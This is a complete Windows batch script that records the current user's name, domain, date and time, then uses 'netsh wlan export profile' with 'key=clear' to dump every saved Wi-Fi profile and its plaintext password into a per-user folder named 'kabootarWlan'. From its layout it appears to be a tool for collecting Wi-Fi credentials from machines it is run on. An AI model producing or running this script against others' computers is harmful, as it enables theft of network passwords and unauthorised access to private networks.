@echo off

echo ==================================================================================== > kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ==================================================================================== >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
date /t >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
time /t >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo "%USERNAME%" >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo "%userdomain%" >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
mkdir kabootarWlan\"%username%"

netsh wlan export profile folder="kabootarWlan\%username%" key=clear >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"

echo ==================================================================================== >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
